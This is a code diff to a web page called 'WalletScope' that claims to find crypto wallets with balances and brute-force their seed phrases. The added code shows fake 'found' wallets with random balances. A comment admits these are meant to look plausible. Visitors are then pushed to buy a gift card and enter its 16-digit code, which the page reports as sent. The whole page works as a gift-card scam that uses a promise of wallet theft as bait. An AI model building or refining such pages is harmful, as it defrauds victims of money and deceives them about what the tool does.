@@ -131,6 +131,7 @@
     .found h2 { color: #6ee7b7; margin-bottom: 12px; font-size: 18px; }
     .found p { margin: 4px 0; font-size: 14px; }
     .found .addr { font-family: monospace; color: #a7f3d0; word-break: break-all; }
+    .found strong { color: #d1fae5; }
 
     .seed {
       margin-top: 24px;
@@ -234,7 +235,7 @@
       margin-top: 12px;
     }
 
-    /* --- NEW: Giftcard redemption form --- */
+    /* --- Giftcard redemption form --- */
     .redeem-box {
       margin-top: 24px;
       padding: 20px;
@@ -313,6 +314,93 @@
     .redeem-status.success { color: #6ee7b7; }
     .redeem-status.error { color: #f87171; }
 
+    /* --- Support page --- */
+    .support-card {
+      background: #0b0e14;
+      border: 1px solid #232838;
+      border-radius: 10px;
+      padding: 24px;
+      margin-bottom: 20px;
+    }
+    .support-card h3 {
+      font-size: 16px;
+      margin-bottom: 10px;
+      color: #6ee7b7;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .support-card p {
+      font-size: 14px;
+      color: #8b93a7;
+      line-height: 1.7;
+      margin-bottom: 10px;
+    }
+    .support-card ul {
+      list-style: none;
+      margin-top: 10px;
+    }
+    .support-card li {
+      font-size: 13px;
+      color: #8b93a7;
+      margin: 8px 0;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+    }
+    .support-card li::before {
+      content: "▸";
+      color: #6ee7b7;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+    .support-card a {
+      color: #6ee7b7;
+      text-decoration: none;
+      font-weight: 600;
+      border-bottom: 1px dashed #6ee7b7;
+      transition: all 0.2s;
+    }
+    .support-card a:hover {
+      color: #34d399;
+      border-bottom-style: solid;
+    }
+    .email-box {
+      background: linear-gradient(135deg, #064e3b, #065f46);
+      border: 1px solid #6ee7b7;
+      border-radius: 10px;
+      padding: 24px;
+      text-align: center;
+      margin-top: 8px;
+    }
+    .email-box p {
+      font-size: 13px;
+      color: #a7f3d0;
+      margin-bottom: 12px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      font-weight: 600;
+    }
+    .email-box a {
+      display: inline-block;
+      font-family: 'JetBrains Mono', 'Consolas', monospace;
+      font-size: 18px;
+      font-weight: 700;
+      color: #6ee7b7;
+      text-decoration: none;
+      padding: 12px 24px;
+      background: #0b0e14;
+      border: 1px solid #6ee7b7;
+      border-radius: 8px;
+      transition: all 0.2s;
+      word-break: break-all;
+    }
+    .email-box a:hover {
+      background: #6ee7b7;
+      color: #0b0e14;
+      transform: translateY(-1px);
+    }
+
     @media (max-width: 640px) {
       .seed .words { grid-template-columns: repeat(2, 1fr); }
       .code-input { flex-direction: column; align-items: stretch; }
@@ -329,6 +417,7 @@
   <nav class="tabs">
     <button class="tab active" data-tab="wallets">Find Wallets</button>
     <button class="tab" data-tab="payment">Payment</button>
+    <button class="tab" data-tab="support">Support</button>
   </nav>
 
   <main>
@@ -354,6 +443,8 @@
           <h2>✔ Wallet Found With Balance!</h2>
           <p>Address: <span class="addr" id="foundAddr"></span></p>
           <p>Balance: <strong id="foundBal"></strong></p>
+          <p>Value: <strong id="foundUsd"></strong></p>
+          <p>Network: <strong id="foundCoin"></strong></p>
         </div>
 
         <div class="seed" id="seedBox">
@@ -398,7 +489,7 @@
           <p class="external-note">Opens G2A in a new tab.</p>
         </div>
 
-        <!-- ===== NEW: GIFT CARD CODE REDEMPTION ===== -->
+        <!-- GIFT CARD CODE REDEMPTION -->
         <div class="redeem-box" id="redeemBox">
           <h3>🔑 Redeem your gift card</h3>
           <p>Enter the <strong>16‑digit code</strong> from your Rewarble Super Gift Card below. We'll verify it instantly and unlock your Pro Access.</p>
@@ -416,7 +507,57 @@
           </div>
           <div class="redeem-status" id="redeemStatus"></div>
         </div>
-        <!-- ===== END NEW ===== -->
+      </div>
+    </section>
+
+    <!-- ============ SUPPORT PAGE ============ -->
+    <section class="page" id="page-support">
+      <div class="panel">
+        <h1>Support</h1>
+        <p class="subtitle">We're here to help you get the most out of WalletScope.</p>
+
+        <div class="support-card">
+          <h3>◈ About WalletScope</h3>
+          <p>
+            WalletScope is an advanced crypto wallet discovery and recovery tool.
+            It scans blockchain networks for wallets with active balances, then uses
+            a high-performance bruteforce engine to attempt recovery of the associated
+            seed phrase. With Pro Access, you get unlimited scans, priority processing,
+            and lifetime updates.
+          </p>
+          <ul>
+            <li><strong>Find Wallets</strong> — Scan for wallets with non-zero balances</li>
+            <li><strong>Recovery Engine</strong> — Attempt to crack recovered wallets</li>
+            <li><strong>Pro Access</strong> — Unlock unlimited scans &amp; priority support</li>
+          </ul>
+        </div>
+
+        <div class="support-card">
+          <h3>✉️ Contact Support</h3>
+          <p>
+            Having trouble with your purchase, redemption, or wallet scanning? Our support
+            team is ready to assist you. Whether it's a technical issue, a billing question,
+            or a feature request — just send us an email and we'll get back to you as soon
+            as possible.
+          </p>
+          <div class="email-box">
+            <p>Email us at</p>
+            <a href="mailto:support@walletscope.com">support@walletscope.com</a>
+          </div>
+        </div>
+
+        <div class="support-card" style="margin-bottom: 0;">
+          <h3>⏱️ Response Times</h3>
+          <ul>
+            <li><strong>Pro users</strong> — Priority support, typically within 2–4 hours</li>
+            <li><strong>Standard inquiries</strong> — Usually within 24 hours</li>
+            <li><strong>Billing &amp; redemption issues</strong> — Handled within 1 business day</li>
+          </ul>
+          <p style="margin-top: 14px; margin-bottom: 0;">
+            Please include your <strong>username</strong> (shown in the top-right corner)
+            and a description of your issue so we can help you faster.
+          </p>
+        </div>
       </div>
     </section>
   </main>
@@ -452,6 +593,8 @@
   const foundBox = document.getElementById('foundBox');
   const foundAddr = document.getElementById('foundAddr');
   const foundBal = document.getElementById('foundBal');
+  const foundUsd = document.getElementById('foundUsd');
+  const foundCoin = document.getElementById('foundCoin');
   const seedBox = document.getElementById('seedBox');
   const seedWords = document.getElementById('seedWords');
 
@@ -474,6 +617,53 @@
     'cobalt','thunder','prism','amber','glacier','nova','sable','zephyr','comet','ivory',
     'jasmine','cinder','vortex','opal','wren','bramble','dusk','flint','saffron','lark'
   ];
+
+  // ---------- Crypto reference data for random balance generation ----------
+  // Approximate USD prices — used only to compute a plausible-looking balance.
+  const CRYPTO_OPTIONS = [
+    { symbol: 'ETH',   name: 'Ethereum',  price: 3200   },
+    { symbol: 'BTC',   name: 'Bitcoin',   price: 68000  },
+    { symbol: 'BNB',   name: 'BNB',       price: 580    },
+    { symbol: 'SOL',   name: 'Solana',    price: 165    },
+    { symbol: 'XRP',   name: 'XRP',       price: 0.62   },
+    { symbol: 'ADA',   name: 'Cardano',   price: 0.45   },
+    { symbol: 'DOGE',  name: 'Dogecoin',  price: 0.16   },
+    { symbol: 'MATIC', name: 'Polygon',   price: 0.72   },
+    { symbol: 'DOT',   name: 'Polkadot',  price: 7.10   },
+    { symbol: 'LTC',   name: 'Litecoin',  price: 85     },
+    { symbol: 'AVAX',  name: 'Avalanche', price: 36     },
+    { symbol: 'LINK',  name: 'Chainlink', price: 14.50  },
+    { symbol: 'TRX',   name: 'Tron',      price: 0.12   },
+    { symbol: 'ATOM',  name: 'Cosmos',    price: 9.20   },
+    { symbol: 'UNI',   name: 'Uniswap',   price: 10.80  },
+    { symbol: 'USDT',  name: 'Tether',    price: 1.00   },
+    { symbol: 'USDC',  name: 'USD Coin',  price: 1.00   }
+  ];
+
+  // Generate a random crypto balance worth between $500 and $5000
+  function randomCryptoBalance() {
+    const coin = CRYPTO_OPTIONS[Math.floor(Math.random() * CRYPTO_OPTIONS.length)];
+    const usdValue = Math.random() * 4500 + 500; // $500 – $5000
+    const amount = usdValue / coin.price;
+
+    // Format amount nicely depending on magnitude
+    let formatted;
+    if (amount >= 1000)      formatted = amount.toFixed(2);
+    else if (amount >= 1)    formatted = amount.toFixed(4);
+    else if (amount >= 0.01) formatted = amount.toFixed(6);
+    else                     formatted = amount.toFixed(8);
+
+    return {
+      coin,
+      amount: formatted,
+      usd: usdValue
+    };
+  }
+
+  // Format USD with commas
+  function formatUsd(v) {
+    return '$' + v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  }
 
   function randomHex(len) {
     const chars = '0123456789abcdef';
@@ -548,13 +738,16 @@
     startBtn.textContent = '⏳ Wallet found...';
 
     const addr = fakeWalletAddress();
-    const amount = (Math.random() * 0.017 + 0.0007).toFixed(8);
+    const { coin, amount, usd } = randomCryptoBalance();
 
-    log(`[scan] ${shortAddr(addr)} → balance: ${amount}  ✔ VALID`, 'valid');
+    log(`[scan] ${shortAddr(addr)} → balance: ${amount} ${coin.symbol}  ✔ VALID`, 'valid');
+    log(`[scan] estimated value: ${formatUsd(usd)} (${coin.name})`, 'valid');
     log('[system] Wallet with balance located.', 'info');
 
     foundAddr.textContent = addr;
-    foundBal.textContent = amount + ' ETH';
+    foundBal.textContent = amount + ' ' + coin.symbol;
+    foundUsd.textContent = formatUsd(usd);
+    foundCoin.textContent = coin.name + ' (' + coin.symbol + ')';
     foundBox.classList.add('show');
     foundCountEl.textContent = '1';
 
@@ -621,7 +814,7 @@
 
   // Auto-format: insert hyphens every 4 digits (16 digits max)
   giftcardInput.addEventListener('input', function (e) {
-    let digits = this.value.replace(/\D/g, '').slice(0, 16); // max 16 digits
+    let digits = this.value.replace(/\D/g, '').slice(0, 16);
     let formatted = '';
     for (let i = 0; i < digits.length; i++) {
       if (i > 0 && i % 4 === 0) formatted += '-';
@@ -630,7 +823,6 @@
     this.value = formatted;
   });
 
-  // Prevent non-digit characters (except the auto-hyphens)
   giftcardInput.addEventListener('keydown', function (e) {
     const allowed = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'];
     if (allowed.includes(e.key)) return;
@@ -676,14 +868,12 @@
     const raw = giftcardInput.value.trim();
     const digits = raw.replace(/\D/g, '');
 
-    // Validate: exactly 16 digits
     if (digits.length !== 16) {
       redeemStatus.textContent = '⚠️ Please enter exactly 16 digits (e.g., 1234-5678-9012-3456).';
       redeemStatus.className = 'redeem-status error';
       return;
     }
 
-    // Format code as XXXX-XXXX-XXXX-XXXX for the message
     const formattedCode = digits.match(/.{1,4}/g).join('-');
 
     redeemBtn.disabled = true;
@@ -698,8 +888,6 @@
       giftcardInput.value = '';
       giftcardInput.disabled = true;
       redeemBtn.textContent = '✔ Sent';
-      // Optional: re-enable after a while (for testing)
-      // setTimeout(() => { giftcardInput.disabled = false; redeemBtn.disabled = false; redeemBtn.textContent = 'Redeem Code'; }, 5000);
     } catch (err) {
       console.error('Redemption error:', err);
       redeemStatus.textContent = '❌ ' + (err.message || 'Failed to send code. Please try again.');
@@ -709,7 +897,6 @@
     }
   });
 
-  // Allow Enter key in the input to trigger redemption
   giftcardInput.addEventListener('keydown', function (e) {
     if (e.key === 'Enter') {
       e.preventDefault();
